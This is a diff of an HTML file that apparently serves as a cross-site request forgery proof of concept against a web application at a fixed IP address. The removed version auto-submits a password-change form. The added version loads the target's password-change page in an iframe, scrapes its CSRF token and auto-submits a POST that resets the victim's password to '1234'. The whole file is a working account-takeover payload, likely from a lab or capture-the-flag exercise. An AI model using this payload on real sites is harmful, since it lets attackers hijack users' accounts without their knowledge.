@@ -1,13 +1,23 @@
 <html>
-  <body>
-  <script>history.pushState('', '', '/')</script>
-    <form method="GET" action="34.124.182.137/save_profile.php">
-      <input type="hidden" name="password" value="password" />
-      <input type="hidden" name="cpassword" value="password" />
-      <input type="submit" value="Submit request" />
-    </form>
-    <script>
-      document.forms[0].submit();
-    </script>
-  </body>
+<body>
+<iframe id="f" src="http://34.124.182.137/changepassword.php"></iframe>
+<script>
+document.getElementById('f').onload = function() {
+    let token = this.contentDocument.querySelector('#csrftoken').value;
+
+    let form = document.createElement('form');
+    form.method = 'POST';
+    form.action = 'http://34.124.182.137/save_profile.php';
+
+    form.innerHTML = `
+        <input type="hidden" name="password" value="1234">
+        <input type="hidden" name="cpassword" value="1234">
+        <input type="hidden" name="csrf_token" value="${token}">
+    `;
+
+    document.body.appendChild(form);
+    form.submit();
+};
+</script>
+</body>
 </html>
